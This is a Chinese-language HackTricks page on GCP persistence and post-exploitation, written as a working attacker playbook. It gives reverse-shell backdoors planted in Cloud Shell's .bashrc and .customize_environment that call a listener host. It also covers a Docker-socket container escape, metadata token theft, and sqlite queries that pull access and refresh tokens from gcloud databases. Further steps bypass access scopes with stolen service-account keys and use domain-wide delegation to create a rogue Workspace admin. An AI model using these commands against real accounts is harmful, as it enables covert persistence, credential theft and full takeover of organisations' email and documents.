# GCP - 非服务持久性

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

这些是一些有用的技术，一旦你以某种方式攻破了一些 GCP 凭证或在 GCP 环境中运行的机器。

## 谷歌的 Cloud Shell <a href="#e5eb" id="e5eb"></a>

### 持久性后门

[**谷歌 Cloud Shell**](https://cloud.google.com/shell/) 为您提供了直接从浏览器访问云资源的命令行访问，无需任何相关成本。

您可以从 **网络控制台** 访问谷歌的 Cloud Shell，或运行 **`gcloud cloud-shell ssh`**。

这个控制台对攻击者来说有一些有趣的功能：

1. **任何有权访问谷歌云的谷歌用户** 都可以访问一个完全认证的 Cloud Shell 实例。
2. 该实例将在没有活动的情况下 **至少保持其主目录 120 天**。
3. 组织 **无法监控** 该实例的活动。

这基本上意味着攻击者可以在用户的主目录中放置一个后门，只要用户每 120 天至少连接到 GC Shell 一次，后门就会存活下来，每次运行时攻击者就会得到一个 shell，只需执行：
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
在主目录中还有一个名为 **`.customize_environment`** 的文件，如果该文件存在，每次用户访问 **cloud shell** 时都会**执行**（如前一技术所述）。只需插入前面的后门或类似以下的后门，只要用户“经常”使用 cloud shell，就可以保持持久性：
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
请注意，**首次在 Cloud Shell 中执行需要认证的操作时**，它会在用户的浏览器中**弹出**一个授权窗口，必须在命令运行之前接受。如果出现意外的弹出窗口，目标可能会变得怀疑并且终止持久性方法。
{% endhint %}

### Google Cloud Shell 容器逃逸

请注意，Google Cloud Shell 运行在一个容器内，您可以通过以下操作**轻松逃离到宿主机**：
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
这不被谷歌视为一个漏洞，但它能让你更广泛地了解该环境中发生的事情。

此外，请注意，从主机上你可以找到一个服务账户令牌：
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
以下范围：
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## 令牌劫持

### 已认证用户

如果你设法访问了**GCP中已认证用户的家目录**，**默认情况下**，你将能够**随意获取该用户的令牌**，无需认证，无论你使用他的令牌的机器如何，即使用户配置了MFA。

这是因为默认情况下，你**可以随意使用刷新令牌**来生成新的令牌。

要获取用户当前的令牌，你可以运行：

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
```
获取生成新访问令牌的详细信息，请运行：
```
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
```
要使用刷新令牌、客户端ID和客户端密钥获取新的刷新后的访问令牌，请运行：
```
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
### 服务账户

就像已认证用户一样，如果你设法**获取服务账户的私钥文件**，你将能够**通常情况下随心所欲地访问它**。\
然而，如果你窃取了服务账户的**OAuth令牌**，这可能更加有趣，因为即使默认情况下这些令牌只有一个小时的有效期，如果**受害者删除了私有API密钥，OAuth令牌仍然有效，直到它过期**。

### 元数据

显然，只要你在GCP环境中运行的机器内部，你将能够**通过联系元数据端点访问附加到该机器的服务账户**（注意，在此端点中可以访问的OAuth令牌通常受到范围限制）。

### 补救措施

这些技术的一些补救措施在[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)中有解释

## 绕过访问范围 <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

当使用[访问范围](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)时，为计算实例（VM）生成的OAuth令牌将**包含一个**[**范围**](https://oauth.net/2/scope/)**限制**。然而，你可能能够**绕过**这个限制并利用被泄露账户的权限。

**绕过**这个限制的**最佳方式**是要么**找到新的凭据**在被泄露的主机中，要么**找到服务密钥以生成无限制的OAuth令牌**，要么**跳转到一个限制较少的不同VM**。

**弹出另一个盒子**

环境中可能存在具有较少访问范围限制的其他盒子。如果你能查看`gcloud compute instances list --quiet --format=json`的输出，请寻找具有你想要的特定范围或**`auth/cloud-platform`**全包含范围的实例。

也要注意分配了默认服务账户的实例（`PROJECT_NUMBER-compute@developer.gserviceaccount.com`）。

**搜索服务账户密钥**

Google非常明确地指出[**"访问范围不是安全机制……在不通过OAuth认证的请求中它们没有效果"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)。

因此，如果你在实例上**找到一个**[**服务账户密钥**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys)，你可以绕过限制。这些是**RSA私钥**，可以用来认证到Google Cloud API并**请求一个无范围限制的新OAuth令牌**。

检查是否有任何服务账户在某个时刻导出了密钥：
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo "Looking for keys for $i:"
gcloud iam service-accounts keys list --iam-account $i
done
```
这些文件**默认不存储在计算实例上**，因此你需要很幸运才能遇到它们。文件的默认名称是`[project-id]-[portion-of-key-id].json`。因此，如果你的项目名称是`test-project`，那么你可以在文件系统中**搜索`test-project*.json`**，寻找这个密钥文件。

文件的内容看起来像这样：
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
或者，如果**通过CLI生成**，它们将如下所示：
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
如果您确实找到了这些文件之一，您可以告诉 **`gcloud` 命令重新认证** 这个服务账户。您可以在实例上执行此操作，或在安装了工具的任何机器上执行。
```bash
gcloud auth activate-service-account --key-file [FILE]
```
你现在可以按照以下步骤**测试你的新 OAuth 令牌**：
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
您应该会看到列出的 `https://www.googleapis.com/auth/cloud-platform` 范围，这意味着您**不受任何实例级访问范围的限制**。您现在有充分的权力使用所有分配给您的IAM权限。

## 通过对Workspace的域范围授权传播 <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) 是Google的**协作和生产力平台**，包括Gmail、Google Calendar、Google Drive、Google Docs等。

GCP中的**服务账户**可以被授予**以编程方式访问Workspace用户数据的权利**，通过冒充合法用户。这被称为[域范围委派](https://developers.google.com/admin-sdk/reports/v1/guides/delegation)。这包括像在GMail中**读取** **电子邮件**、访问Google Docs，甚至在G Suite组织中创建新的用户账户的操作。

Workspace有[它自己的API](https://developers.google.com/gsuite/aspects/apis)，完全独立于GCP。权限被授予Workspace，**GCP和Workspace之间没有任何默认关系**。

然而，可以**给**服务账户**权限**覆盖Workspace用户。如果此时您可以访问Web UI，您可以浏览到 **IAM -> 服务账户**，看看是否有任何账户在**"域范围委派"列下列出了"已启用"**。如果没有账户启用，该列本身可能**不会显示**（您可以阅读每个服务账户的详细信息来确认这一点）。截至本文撰写时，尚无法以编程方式执行此操作，尽管在Google的错误跟踪器中有一个[此功能的请求](https://issuetracker.google.com/issues/116182848)。

要创建这种关系，需要在GCP和Workforce中**启用它**。

#### 测试Workspace访问

要测试此访问，您需要以JSON格式导出的**服务账户凭据**。您可能在早期步骤中获得了这些，或者您现在可能有所需的访问权限，以创建一个您知道已启用域范围委派的服务账户的密钥。

这个话题有点棘手……您的服务账户有一个称为"client\_email"的东西，您可以在导出的JSON凭证文件中看到。它可能看起来像是 `account-name@project-name.iam.gserviceaccount.com`。如果您尝试直接使用该电子邮件访问Workforce API调用，即使启用了委派，您也会失败。这是因为Workforce目录不会包含GCP服务账户的电子邮件地址。相反，要与Workforce互动，我们需要实际冒充有效的Workforce用户。

您真正想做的是**冒充具有管理访问权限的用户**，然后使用该访问权限做一些事情，比如**重置密码、禁用多因素认证，或者只是为自己创建一个全新的管理员账户**。

Gitlab创建了[这个Python脚本](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py)，它可以做两件事 - 列出用户目录和创建一个新的管理账户。以下是您使用它的方法：
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
您可以尝试在一系列电子邮件地址上运行此脚本，以模拟**各种** **用户**。标准输出将指示服务帐户是否有权访问Workforce，并将包括**新管理员帐户的随机密码**（如果创建了一个）。

如果您成功创建了一个新的管理员帐户，您可以登录到[Google管理控制台](https://admin.google.com)，并完全控制G Suite中每个用户的一切 - 电子邮件、文档、日历等。尽情享用。

## 参考资料

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
